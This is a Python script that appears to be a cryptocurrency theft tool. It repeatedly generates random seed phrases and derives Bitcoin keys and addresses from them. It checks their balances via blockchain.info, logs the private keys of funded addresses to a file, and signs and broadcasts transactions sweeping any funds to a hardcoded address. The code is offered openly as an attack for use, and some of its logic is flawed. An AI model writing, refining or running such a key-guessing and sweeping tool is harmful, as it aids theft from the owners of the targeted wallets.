import hashlib
import base58
import ecdsa
import requests
from bitcoinlib.wallets import Wallet, wallet_delete
from bitcoinlib.keys import HDKey
from rich.console import Console
from rich.table import Table
from mnemonic import Mnemonic
import os
import time
import socket

# Function to convert private key to WIF
def private_key_to_wif(private_key, compressed=True):
    prefix = b'\x80' + private_key
    if compressed:
        prefix += b'\x01'
    checksum = hashlib.sha256(hashlib.sha256(prefix).digest()).digest()[:4]
    return base58.b58encode(prefix + checksum).decode()

# Function to derive the Bitcoin address
def private_key_to_address(private_key, compressed=True):
    sk = ecdsa.SigningKey.from_string(private_key, curve=ecdsa.SECP256k1)
    vk = sk.verifying_key
    if compressed:
        public_key = b'\x02' + vk.to_string()[:32] if vk.to_string()[-1] % 2 == 0 else b'\x03' + vk.to_string()[:32]
    else:
        public_key = b'\x04' + vk.to_string()
    ripemd160 = hashlib.new('ripemd160')
    ripemd160.update(hashlib.sha256(public_key).digest())
    hashed_public_key = ripemd160.digest()
    address_prefix = b'\x00' + hashed_public_key
    checksum = hashlib.sha256(hashlib.sha256(address_prefix).digest()).digest()[:4]
    return base58.b58encode(address_prefix + checksum).decode()

# Function to fetch UTXOs
def fetch_utxos(address):
    url = f"https://blockchain.info/unspent?active={address}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        return data.get('unspent_outputs', [])
    else:
        return []

# Function to calculate total balance
def calculate_total_balance(utxos):
    return sum(utxo['value'] for utxo in utxos)

# Function to create and sign the transaction
def create_signed_transaction(utxos, from_address, to_address, private_key_wif):
    if not utxos:
        raise Exception("No UTXOs found")

    w = Wallet.create('sweep_wallet', keys=private_key_wif, network='bitcoin', witness_type='legacy')
    w.utxos_update()
    utxos = w.utxos()
    if not utxos:
        raise Exception("No UTXOs found in wallet")

    balance_btc = calculate_total_balance(utxos) / 1e8
    tx = w.transaction_create([(to_address, balance_btc, 'btc')], fee=10000)
    tx_signed = w.transaction_sign(tx)
    return tx_signed

# Function to check network connectivity
def check_network():
    try:
        socket.create_connection(("1.1.1.1", 53))
        return True
    except OSError:
        return False

# Function to save WIF to file
def save_wif_to_file(wif, balance):
    with open('wif_with_balance.txt', 'a') as file:
        file.write(f"{wif}, Balance: {balance:.8f} BTC\n")

# Address to sweep to
to_address = "3KgiK7FdnEHpBDt3uie9mU1QRnVN8sP81o"

# Generate mnemonics
mnemo = Mnemonic("english")
mnemonic_lengths = [12, 18, 24]

def generate_mnemonic(length):
    entropy = os.urandom(length * 4 // 3)
    return mnemo.to_mnemonic(entropy)

while True:
    if not check_network():
        print("Network connection lost. Retrying in 60 seconds...")
        time.sleep(60)
        continue

    mnemonics = [generate_mnemonic(length) for length in mnemonic_lengths for _ in range(5)]

    # Initialize console and table
    console = Console()
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Type", style="dim", width=12)
    table.add_column("WIF", width=52)
    table.add_column("Address", width=42)
    table.add_column("Balance (BTC)", justify="right")

    # Process each mnemonic
    for mnemonic in mnemonics:
        # Derive the seed from the mnemonic
        seed = mnemo.to_seed(mnemonic)
        hd_key = HDKey.from_seed(seed)

        # Get the private key in raw bytes
        private_key = hd_key.private_byte

        # Generate WIF keys
        wif_compressed = private_key_to_wif(private_key, compressed=True)
        wif_uncompressed = private_key_to_wif(private_key, compressed=False)
        
        # Derive addresses
        address_compressed = private_key_to_address(private_key, compressed=True)
        address_uncompressed = private_key_to_address(private_key, compressed=False)

        # Fetch UTXOs and calculate balances
        try:
            utxos_compressed = fetch_utxos(address_compressed)
            balance_satoshis_compressed = calculate_total_balance(utxos_compressed)
            balance_btc_compressed = balance_satoshis_compressed / 1e8

            utxos_uncompressed = fetch_utxos(address_uncompressed)
            balance_satoshis_uncompressed = calculate_total_balance(utxos_uncompressed)
            balance_btc_uncompressed = balance_satoshis_uncompressed / 1e8
        except Exception as e:
            print(f"Error fetching UTXOs: {e}")
            continue

        # Add data to table
        table.add_row("Compressed", wif_compressed, address_compressed, f"{balance_btc_compressed:.8f}")
        table.add_row("Uncompressed", wif_uncompressed, address_uncompressed, f"{balance_btc_uncompressed:.8f}")

        # Save WIF if balance is above 0.001 BTC
        if balance_btc_compressed > 0.001:
            save_wif_to_file(wif_compressed, balance_btc_compressed)

        if balance_btc_uncompressed > 0.001:
            save_wif_to_file(wif_uncompressed, balance_btc_uncompressed)

        # Sweep funds if balance is available
        transaction_created = False
        
        if balance_btc_compressed > 0:
            try:
                tx_signed_compressed = create_signed_transaction(utxos_compressed, address_compressed, to_address, wif_compressed)
                tx_hex_compressed = tx_signed_compressed.as_hex()

                def broadcast_transaction(tx_hex):
                    url = "https://blockchain.info/pushtx"
                    response = requests.post(url, data={'tx': tx_hex})
                    return response.text

                broadcast_result_compressed = broadcast_transaction(tx_hex_compressed)
                transaction_created = True
            except Exception as e:
                print(f"Error creating or broadcasting transaction: {e}")
        
        if balance_btc_uncompressed > 0:
            try:
                tx_signed_uncompressed = create_signed_transaction(utxos_uncompressed, address_uncompressed, to_address, wif_uncompressed)
                tx_hex_uncompressed = tx_signed_uncompressed.as_hex()

                broadcast_result_uncompressed = broadcast_transaction(tx_hex_uncompressed)
                transaction_created = True
            except Exception as e:
                print(f"Error creating or broadcasting transaction: {e}")
        
        # Clean up the created wallet if a transaction was created
        if transaction_created:
            wallet_delete('sweep_wallet')
        
        # Refresh the table display
        console.clear()
        console.print(table)

    # Print the final table
    console.clear()
    console.print(table)
    
    # Pause for a short period before repeating the loop
    time.sleep(30)
